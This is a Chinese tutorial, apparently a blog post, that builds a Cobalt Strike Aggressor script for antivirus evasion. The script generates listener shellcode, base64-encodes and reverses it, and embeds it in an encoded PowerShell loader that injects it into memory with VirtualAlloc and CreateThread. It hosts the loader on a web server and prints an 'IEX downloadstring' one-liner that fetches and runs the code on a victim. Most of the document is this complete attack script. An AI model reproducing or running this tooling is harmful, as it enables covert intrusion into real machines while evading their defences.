# 0x00 简介

编写一个简单脚本我们以前面学的powershell免杀为例 我们只需要把上次写的payload替换掉就可以了

整理下思路：

用户输入ip和目录 -> 编码利用shellcode()函数生成的shellcode -> 反转编码 -> 替换payload -> 启动web服务 -> 输出payload URL

# 0x01 过程

### 窗口编写

窗口我们只需要 HOST PORT PUSH 监听器选择栏 这个直接注册到 attacks菜单栏就行了

```
popup attacks {
    item "bypassav_shellcode" {
        local('$dialog %parameter');
        %parameter["uri"]  = "/a";
        %parameter["host"] = localip();
        %parameter["port"] = 8080;
        $dialog = dialog("bypassav_shellcode", %parameter, &new_payload);
        dialog_description($dialog, "bypassav_shellcode");
        drow_text($dialog, "uri", "URI Path: ", 20);
        drow_text($dialog, "host", "Local Host: ");
        drow_text($dialog, "port", "Local Port: ");
        drow_listener_stage($dialog, "listener", "Listener: "); 
        dbutton_action($dialog, "run");
        dialog_show($dialog);
    }
}

```

用local注册2个变量 %parameter是类似字典的变量 其中dialog() dialog_description() drow_text() localip() drow_listener_stage() dbutton_action() dialog_show()皆为CS提供的函数 ,官方文档已经写的很清楚了前面我也提过几个。


### 反转 编码 生成shellcode

```
    $payload = shellcode($3['listener'],false,"x86");
    $base64_payload = base64_encode($payload);
    @array_payload = split('',$base64_payload);
    @reverse_payload = reverse(@array_payload);
    $string_reverse_payload = join("",@reverse_payload);

```

其中$3为前面dialog() 函数回调我们给我们的字典 ,用shellcode() 函数生成原生shellcode 然后用CS提供的base64_encode()函数编码  再转成数组 反序加入字符串 

整个反转编码我们完成了


###  替换payload

```
   $data = "";
   $data = $data ."U2V0LVN0cmljdE1vZGUgLVZlcnNpb24gMgokZWljYXIgPSAnJwokRG9JdCA9IEAnCiRhc3NlbWJseSA9IEAiCiAgICB1\r\n";
   $decode_payload = base64_decode($data);
   $powershell_payload = replace($decode_payload,"thisispayload",$string_reverse_payload);

```

这里我直接把前面那章的powershell 脚本编码了 然后解码替换。

### 启动WEB

```
   $url = site_host($3['host'],$3['port'],$3['uri'],$powershell_payload,"text/plain","powershell bypass av",false);
   prompt_text("URL: ", "powershell -nop -exec bypass  -c \"IEX ((new-object net.webclient).downloadstring(\'".$url."\'))\"", {});

```

利用site_host() 函数启动web服务 然后返回对话框让我们复制 


### 组合脚本

```
# bypass AV powershell
# Author: 404

sub new_payload{
    $payload = shellcode($3['listener'],false,"x86");
    $base64_payload = base64_encode($payload);
    @array_payload = split('',$base64_payload);
    @reverse_payload = reverse(@array_payload);
    $string_reverse_payload = join("",@reverse_payload);

    $data = "";
    $data = $data ."U2V0LVN0cmljdE1vZGUgLVZlcnNpb24gMgokZWljYXIgPSAnJwokRG9JdCA9IEAnCiRhc3NlbWJseSA9IEAiCiAgICB1\r\n";
    $data = $data ."c2luZyBTeXN0ZW07CiAgICB1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7CiAgICBuYW1lc3BhY2Ug\r\n";
    $data = $data ."aW5qZWN0IHsKICAgICAgICBwdWJsaWMgY2xhc3MgZnVuYyB7CiAgICAgICAgICAgIFtGbGFnc10gcHVibGljIGVudW0g\r\n";
    $data = $data ."QWxsb2NhdGlvblR5cGUgeyBDb21taXQgPSAweDEwMDAsIFJlc2VydmUgPSAweDIwMDAgfQogICAgICAgICAgICBbRmxh\r\n";
    $data = $data ."Z3NdIHB1YmxpYyBlbnVtIE1lbW9yeVByb3RlY3Rpb24geyBFeGVjdXRlUmVhZFdyaXRlID0gMHg0MCB9CiAgICAgICAg\r\n";
    $data = $data ."ICAgIFtGbGFnc10gcHVibGljIGVudW0gVGltZSA6IHVpbnQgeyBJbmZpbml0ZSA9IDB4RkZGRkZGRkYgfQogICAgICAg\r\n";
    $data = $data ."ICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV0gcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIFZpcnR1YWxB\r\n";
    $data = $data ."bGxvYyhJbnRQdHIgbHBBZGRyZXNzLCB1aW50IGR3U2l6ZSwgdWludCBmbEFsbG9jYXRpb25UeXBlLCB1aW50IGZsUHJv\r\n";
    $data = $data ."dGVjdCk7CiAgICAgICAgICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXSBwdWJsaWMgc3RhdGljIGV4dGVybiBJ\r\n";
    $data = $data ."bnRQdHIgQ3JlYXRlVGhyZWFkKEludFB0ciBscFRocmVhZEF0dHJpYnV0ZXMsIHVpbnQgZHdTdGFja1NpemUsIEludFB0\r\n";
    $data = $data ."ciBscFN0YXJ0QWRkcmVzcywgSW50UHRyIGxwUGFyYW1ldGVyLCB1aW50IGR3Q3JlYXRpb25GbGFncywgSW50UHRyIGxw\r\n";
    $data = $data ."VGhyZWFkSWQpOwogICAgICAgICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV0gcHVibGljIHN0YXRpYyBleHRl\r\n";
    $data = $data ."cm4gaW50IFdhaXRGb3JTaW5nbGVPYmplY3QoSW50UHRyIGhIYW5kbGUsIFRpbWUgZHdNaWxsaXNlY29uZHMpOwogICAg\r\n";
    $data = $data ."ICAgIH0KICAgIH0KIkAKJGNvbXBpbGVyID0gTmV3LU9iamVjdCBNaWNyb3NvZnQuQ1NoYXJwLkNTaGFycENvZGVQcm92\r\n";
    $data = $data ."aWRlcgokcGFyYW1zID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29kZURvbS5Db21waWxlci5Db21waWxlclBhcmFtZXRlcnMK\r\n";
    $data = $data ."JHBhcmFtcy5SZWZlcmVuY2VkQXNzZW1ibGllcy5BZGRSYW5nZShAKCJTeXN0ZW0uZGxsIiwgW1BzT2JqZWN0XS5Bc3Nl\r\n";
    $data = $data ."bWJseS5Mb2NhdGlvbikpCiRwYXJhbXMuR2VuZXJhdGVJbk1lbW9yeSA9ICRUcnVlCiRyZXN1bHQgPSAkY29tcGlsZXIu\r\n";
    $data = $data ."Q29tcGlsZUFzc2VtYmx5RnJvbVNvdXJjZSgkcGFyYW1zLCAkYXNzZW1ibHkpCkZ1bmN0aW9uIHJldnN0cmluZygkdG9j\r\n";
    $data = $data ."aGFyKQp7CiAgICAkdG9jaGFyID0gJHRvY2hhci5Ub0NoYXJBcnJheSgpCiAgICBbQXJyYXldOjpSZXZlcnNlKCR0b2No\r\n";
    $data = $data ."YXIpCiAgICAkdG9jaGFyID0gLWpvaW4gJHRvY2hhcgogICAgcmV0dXJuICR0b2NoYXIKfQokYSA9IHJldnN0cmluZyAi\r\n";
    $data = $data ."dGhpc2lzcGF5bG9hZCIKW0J5dGVbXV0kdmFyX2NvZGUgPSBbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5n\r\n";
    $data = $data ."KCRhKQokYnVmZmVyID0gICYoICRQU0hvTWVbNF0rJFBTaG9tRVszMF0rJ3gnKShOZXctT2JKZWNUIHNZU1RlbS5pTy5T\r\n";
    $data = $data ."VHJFQU1SRUFERXIoKE5ldy1PYkplY1QgU1lzdGVtLklPLkNPbXByRVNzaU9uLkRlZkxBdEVTVFJFYU0oW2lPLm1lbW9S\r\n";
    $data = $data ."eVN0UkVhTV0gW3NZc3RlbS5jT252RVJUXTo6ZnJPTUJBU2U2NHN0UmlOZygnaTg3TXkwcE5MdEZMSzgxTGpyV3lDc3Nz\r\n";
    $data = $data ."S2lsTnpISE15Y2xQMWpEUVVWQXBTeXlLVDg1UFNkWHpTYzFMTDhsUTBGWXcxRkdJUnRLa0RWYWJXSktabnhkU1daQUtO\r\n";
    $data = $data ."Q01vdFRpMXFDeFZRVGZKdjRpQVV1ZjgzTnpNRWpRRGZWTno4NHNxQTRyeVM0QkNRTFZBZGE0VnFjbWxKYWxCcVlrcDRV\r\n";
    $data = $data ."V1pKYW1hQUE9PScpICxbaW8uY29NUFJFU3NJb04uQ29tUHJlU1NpT25tT2RlXTo6REVDT01wcmVTcyApICkgLFtUZVhU\r\n";
    $data = $data ."LkVuY29kSW5HXTo6YXNDSUkpKS5SZUFkdG9lbmQoKSAKaWYgKFtCb29sXSEkYnVmZmVyKSB7IAogICAgJGdsb2JhbDpy\r\n";
    $data = $data ."ZXN1bHQgPSAzOyAKICAgIHJldHVybiAKfQpbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpD\r\n";
    $data = $data ."b3B5KCR2YXJfY29kZSwgMCwgJGJ1ZmZlciwgJHZhcl9jb2RlLkxlbmd0aCkKW0ludFB0cl0gJHRocmVhZCA9IFtpbmpl\r\n";
    $data = $data ."Y3QuZnVuY106OkNyZWF0ZVRocmVhZCgwLCAwLCAkYnVmZmVyLCAwLCAwLCAwKQppZiAoW0Jvb2xdISR0aHJlYWQpIHsK\r\n";
    $data = $data ."ICAgICRnbG9iYWw6cmVzdWx0ID0gNzsgCiAgICByZXR1cm4gCn0KJHJlc3VsdDIgPSBbaW5qZWN0LmZ1bmNdOjpXYWl0\r\n";
    $data = $data ."Rm9yU2luZ2xlT2JqZWN0KCR0aHJlYWQsIFtpbmplY3QuZnVuYytUaW1lXTo6SW5maW5pdGUpCidACklmIChbSW50UHRy\r\n";
    $data = $data ."XTo6c2l6ZSAtZXEgOCkgewogICAgc3RhcnQtam9iIHsgcGFyYW0oJGEpIElFWCAkYSB9IC1SdW5BczMyIC1Bcmd1bWVu\r\n";
    $data = $data ."dCAkRG9JdCB8IHdhaXQtam9iIHwgUmVjZWl2ZS1Kb2IKfQplbHNlIHsKICAgIElFWCAkRG9JdAp9\r\n";

    $decode_payload = base64_decode($data);
    $powershell_payload = replace($decode_payload,"thisispayload",$string_reverse_payload);

    $url = site_host($3['host'],$3['port'],$3['uri'],$powershell_payload,"text/plain","powershell bypass av",false);

    prompt_text("URL: ", "powershell -nop -exec bypass  -c \"IEX ((new-object net.webclient).downloadstring(\'".$url."\'))\"", {});
    

}

popup attacks {
    item "bypassav_shellcode" {
        local('$dialog %parameter');
        %parameter["uri"]  = "/a";
        %parameter["host"] = localip();
        %parameter["port"] = 8080;
        $dialog = dialog("bypassav_shellcode", %parameter, &new_payload);
        dialog_description($dialog, "bypassav_shellcode");
        drow_text($dialog, "uri", "URI Path: ", 20);
        drow_text($dialog, "host", "Local Host: ");
        drow_text($dialog, "port", "Local Port: ");
        drow_listener_stage($dialog, "listener", "Listener: "); 
        dbutton_action($dialog, "run");
        dialog_show($dialog);
    }
}


```


# 0x02 文末

编写脚本注意多利用官方文档,多看sleep语法,他给我们提供了一些方便快捷的函数，多看看大佬们的脚本也能提高自己。


### 本文如有错误，请及时提醒，以免误导他人